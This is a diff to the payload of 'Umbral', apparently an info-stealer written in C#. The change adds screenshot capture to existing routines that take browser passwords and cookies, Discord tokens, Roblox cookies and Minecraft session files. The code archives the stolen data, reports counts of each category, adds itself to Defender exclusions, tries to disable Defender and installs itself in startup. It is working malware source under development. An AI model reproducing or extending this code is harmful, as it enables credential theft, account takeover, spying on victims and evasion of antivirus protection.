@@ -91,8 +91,8 @@ namespace Umbral.payload
             if (Settings.StealMinecraftFiles)
                 getMinecraftFiles =
                     MinecraftStealer.StealMinecraftFiles(Path.Combine(tempFolder, "Games", "Minecraft"));
-            else
-                await Task.WhenAll(getTokens, getBravePasswords, getChromePasswords, getChromiumPasswords, getComodoPasswords,
+
+            await Task.WhenAll(getTokens, getBravePasswords, getChromePasswords, getChromiumPasswords, getComodoPasswords,
                     getEdgePasswords, getEpicPrivacyPasswords, getIridiumPasswords, getOperaPasswords, getOperaGxPasswords,
                     getSlimjetPasswords, getUrPasswords, getVivaldiPasswords, getYandexPasswords, getBraveCookies,
                     getChromeCookies, getChromiumCookies, getComodoCookies, getEdgeCookies, getEpicPrivacyCookies,
@@ -133,11 +133,14 @@ namespace Umbral.payload
 
             var gotMinecraftFiles = await getMinecraftFiles ? 1 : 0;
 
+            var screenshots = Common.CaptureScreenShot();
+
             var saveProcesses = new List<Task>();
             var cookiesCount = 0;
             var passwordsCount = 0;
             var discordTokenCount = 0;
             var robloxCookieCount = 0;
+            var screenshotCount = 0;
 
             if (discordAccounts.Length > 0 && Settings.StealDiscordtokens)
             {
@@ -145,6 +148,14 @@ namespace Umbral.payload
                 Directory.CreateDirectory(saveTo);
                 saveProcesses.Add(SaveData.SaveToFile(discordAccounts, Path.Combine(saveTo, "Discord Accounts.txt")));
                 discordTokenCount += discordAccounts.Length;
+            }
+
+            if (screenshots.Length > 0 && Settings.TakeScreenshot)
+            {
+                var saveTo = Path.Combine(tempFolder, "Display");
+                Directory.CreateDirectory(saveTo);
+                saveProcesses.Add(Task.Run(() => SaveData.SaveToFile(screenshots, saveTo)));
+                screenshotCount += screenshots.Length;
             }
 
             #region StealPaswords
@@ -371,6 +382,7 @@ namespace Umbral.payload
 
             #endregion
 
+
             await Task.WhenAll(saveProcesses);
             if (Common.Compress(tempFolder, archivePath))
             {
@@ -380,7 +392,8 @@ namespace Umbral.payload
                     { "Passwords", passwordsCount },
                     { "Discord Tokens", discordTokenCount },
                     { "Minecraft Session Files", gotMinecraftFiles },
-                    { "Roblox Cookies", robloxCookieCount }
+                    { "Roblox Cookies", robloxCookieCount },
+                    { "Screenshots", screenshotCount }
                 });
                 File.Delete(archivePath);
             }
@@ -412,7 +425,7 @@ namespace Umbral.payload
             Syscalls.DefenderExclude(Application.ExecutablePath); // Tries to add itself to Defender exclusions
             Syscalls.DisableDefender(); // Tries to disable defender. Fails if tamper protection is enabled.
 
-            if (!Common.IsInStartup() && Settings.Startup && Syscalls.CheckAdminPrivileges()) 
+            if (!Common.IsInStartup() && Settings.Startup && Syscalls.CheckAdminPrivileges())
                 Common.PutInStartup(); // Puts itself in startup
         }
     }
